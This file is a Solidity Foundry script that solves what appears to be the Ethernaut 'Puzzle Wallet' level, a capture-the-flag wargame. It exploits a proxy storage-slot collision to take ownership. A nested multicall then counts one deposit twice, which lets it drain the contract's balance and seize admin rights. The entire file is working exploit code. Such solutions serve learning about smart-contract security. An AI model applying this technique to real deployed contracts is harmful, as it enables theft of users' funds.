// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level24.sol";

contract AttackerScript is Script {
    PuzzleWallet public wallet = PuzzleWallet(0xbAa51D744c56Ac43c0A3c549C79Be39f11c50bA3);
    PuzzleProxy public proxy = PuzzleProxy(payable(0xbAa51D744c56Ac43c0A3c549C79Be39f11c50bA3));

    address bob = vm.addr(1); // exploiter address here

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

      // Owner & pendingAdmin same slot
      proxy.proposeNewAdmin(bob);
      assert(wallet.owner() == bob);

      //Gain full ownership of wallet
      wallet.addToWhitelist(bob);
      wallet.addToWhitelist(address(proxy));

      //Admin and maxBalance same slot, call setMaxBalance (caller should be empty)
      //We need to empty the contract, use multicall to provide 0.001 but call deposit 2x
      //1 multicall [deposit, multicall([deposit])];
      bytes[] memory depositSelector = new bytes[](1);
      depositSelector[0] = abi.encodeWithSelector(wallet.deposit.selector);
      bytes[] memory data = new bytes[](2);
      data[0] = abi.encodeWithSelector(wallet.deposit.selector);
      data[1] = abi.encodeWithSelector(wallet.multicall.selector, depositSelector);

      wallet.multicall{value : 0.001 ether}(data);
      wallet.execute(bob, 0.002 ether, "drain the proxy");
      assert(address(proxy).balance == 0);

      //Provide our address to gain ownership of proxy;
      wallet.setMaxBalance(uint256(uint160(bob)));
      assert(proxy.admin() == bob);
      vm.stopBroadcast();
    }
}
